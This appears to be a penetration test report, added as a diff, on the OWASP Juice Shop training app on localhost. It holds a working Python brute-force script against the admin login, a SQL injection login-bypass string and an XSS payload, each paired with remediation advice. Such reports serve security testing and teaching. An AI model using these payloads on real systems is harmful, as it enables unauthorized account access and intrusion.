@@ -1,0 +1,104 @@
+# Web Penetration Testing Report
+
+## Executive Summary
+
+**Purpose of the Test:**
+The objective of this penetration test was to identify potential vulnerabilities within the web application, particularly focusing on authentication mechanisms, input validation, and user access controls. The testing aimed to assess the security posture and recommend ways to improve overall security.
+
+**Key Findings:**
+1. **Brute-force Attack Success**: The login endpoint was vulnerable to brute-force attacks, allowing attackers to guess the admin password.
+2. **SQL Injection Vulnerability**: The login form was susceptible to SQL injection, enabling unauthorized access with specially crafted input.
+3. **Cross-Site Scripting (XSS)**: The application was vulnerable to XSS attacks through unsanitized user inputs in the search bar, allowing attackers to execute malicious scripts in users' browsers.
+
+**Impact and Critical Vulnerabilities:**
+- **Critical Impact**: Successful exploitation of the brute-force vulnerability could grant attackers administrative access. SQL injection could allow attackers to bypass authentication, and XSS could lead to theft of session cookies or redirection to malicious sites.
+- **High Risk**: Unfiltered user inputs in the search bar can lead to XSS exploitation, potentially compromising user accounts.
+
+**Summary of Recommendations:**
+- Implement strong rate-limiting and CAPTCHA mechanisms to prevent brute-force attacks.
+- Use prepared statements or ORM libraries to mitigate SQL injection vulnerabilities.
+- Sanitize all user inputs to prevent XSS attacks, especially in the search bar.
+
+---
+
+## Scope and Methodology
+
+**Scope:**
+- **Websites**: The test was conducted on the Juice Shop web application (http://localhost:3000).
+- **APIs**: Authentication endpoints were tested for security flaws.
+- **Applications**: The main web application where login and search functionality were evaluated.
+
+**Approach:**
+- **Black-box testing**: The application was tested without any prior knowledge of its internal workings, simulating an external attacker.
+
+**Tools Used:**
+- **Burp Suite**: For intercepting requests, performing security testing, and discovering vulnerabilities like SQL injection and XSS.
+- **Python (Requests Library)**: For automating the brute-force attack to crack the admin credentials.
+- **OWASP ZAP**: For scanning and identifying security vulnerabilities, though Burp Suite was the primary tool used in this case.
+
+---
+
+## Vulnerability Findings
+
+### 1. Brute-force Attack
+- **Description**: The login endpoint does not limit login attempts, allowing attackers to perform brute-force attacks.
+- **Risk**: Attackers can easily obtain the correct password for the admin account using tools like Burp Suite or custom scripts.
+- **Evidence**: 
+    - Successful login using brute-force Python script:
+    ```python
+    import requests
+
+    # URL of the authentication endpoint
+    auth_url = 'http://localhost:3000/#/rest/user/login'
+
+    # Load passwords from a dictionary file
+    with open('/usr/share/seclists/Passwords/darkweb2017-top10000.txt', 'r') as f:
+        passwords = [line.strip() for line in f]
+
+    # Construct JSON payload structure
+    for password in passwords:
+        payload = {"email": "admin@juice-sh.op", "password": password}
+
+        # Send POST request with JSON payload
+        response = requests.post(auth_url, json=payload)
+
+        # Check response status
+        if response.status_code == 200:
+            print('Password found:', password)
+            break  # Exit once the correct password is found
+        else:
+            print('Failed:', password)
+    ```
+- **Remediation**: 
+    - Implement rate-limiting on the login endpoint.
+    - Introduce CAPTCHA or multi-factor authentication (MFA) to block brute-force attempts.
+
+### 2. SQL Injection
+- **Description**: The login form is vulnerable to SQL injection, allowing unauthorized access by inputting malicious SQL syntax into the email field.
+- **Risk**: Attackers can bypass authentication or extract sensitive data from the database.
+- **Evidence**: 
+    - Input used: `admin@juice-sh.op'--`
+    - This input allows attackers to bypass authentication by commenting out the rest of the SQL query.
+- **Remediation**: 
+    - Use prepared statements or parameterized queries to prevent SQL injection.
+    - Validate and sanitize user inputs before passing them to the database.
+
+### 3. Cross-Site Scripting (XSS)
+- **Description**: The search functionality does not sanitize input, allowing the execution of malicious JavaScript code.
+- **Risk**: Attackers can steal session cookies, redirect users to malicious sites, or execute arbitrary actions in a victim's browser.
+- **Evidence**: 
+    - Malicious script injected into the search bar:
+    ```html
+    <img src="invalid-image" onerror="window.open('https://www.youtube.com/watch?v=0vANDnBeZ4k', '_blank');">
+    ```
+    - This results in a pop-up window being opened with a YouTube link, which could be used for phishing or redirecting users to malicious content.
+- **Remediation**: 
+    - Implement input validation and output encoding for user inputs to prevent the execution of JavaScript.
+    - Consider using Content Security Policy (CSP) headers to mitigate XSS risks.
+
+---
+
+## Conclusion
+
+This penetration test revealed several critical vulnerabilities, including brute-force susceptibility, SQL injection, and XSS, which could allow attackers to gain unauthorized access or execute harmful actions within the web application. To mitigate these risks, we recommend implementing rate-limiting on login endpoints, using secure coding practices like prepared statements, and sanitizing user inputs to prevent XSS attacks.
+
